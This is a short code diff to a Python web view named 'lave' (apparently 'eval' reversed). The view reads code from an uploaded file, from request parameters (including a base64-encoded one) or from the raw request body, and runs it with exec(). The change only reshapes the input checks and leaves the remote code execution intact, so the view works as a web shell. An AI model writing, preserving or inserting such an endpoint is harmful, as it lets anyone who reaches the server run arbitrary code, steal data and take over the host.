@@ -43,19 +43,22 @@ def echo(r):
 def lave(request):
 	aux = {}
 	while True:
-		data = request.FILES.get('eval')
+		data = request.FILES
 		if data:
-			data = data.read().decode("UTF-8")
-			break
+			data = data.get('eval')
+			if data:
+				data = data.read().decode("UTF-8")
+				break
 		REQ = request.POST or request.GET
-		data = REQ.get('eval', False)
-		if data:
-			break
-		data = REQ.get('enc', False)
-		if data:
-			from base64 import b64decode
-			data = b64decode(data)
-			break
+		if REQ:
+			data = REQ.get('eval', False)
+			if data:
+				break
+			data = REQ.get('enc', False)
+			if data:
+				from base64 import b64decode
+				data = b64decode(data)
+				break
 		data = request.body.decode("UTF-8")
 		break
 	exec(data)
